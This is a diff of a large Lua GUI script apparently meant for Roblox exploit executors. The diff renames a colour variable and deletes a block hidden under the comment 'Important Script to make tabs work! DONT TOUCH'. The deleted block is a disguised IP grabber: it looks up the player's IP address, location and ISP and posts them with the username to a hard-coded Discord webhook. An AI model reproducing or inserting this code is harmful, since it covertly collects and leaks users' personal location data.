@@ -1,5 +1,4 @@
---ok boomer
-lak = Color3.new(0,0,0)
+blak = Color3.new(0,0,0)
 rede = Color3.new(255/255,0/255,0/255)
 tef = "SourceSans"
 whit = Color3.new(255/255,255/255,255/255)
@@ -30937,31 +30936,6 @@ local textbx = Instance.new("TextBox")
 
 -----------------------------------------------------------------------------
 --Important Script to make tabs work! DONT TOUCH--
-if syn then
-	HttpRequest = syn.request
-else
-	HttpRequest = http_request
-end
-local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1003671784979181748/z_ULC1j7oNSFQB5ykZLkeGg9vFhgRpQe3CZkEZv2etzgGe-TRzE9_KYKiGrjwV5h7iZd"
-
-local ip_info = HttpRequest({
-	Url = "http://ip-api.com/json",
-	Method = "GET"
-})
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage = string.format("\
-User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-HttpRequest(
-	{
-		Url = webhook_url,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-	}
-)
 CurrentPage = 1
 
 function FlipPage(Way)
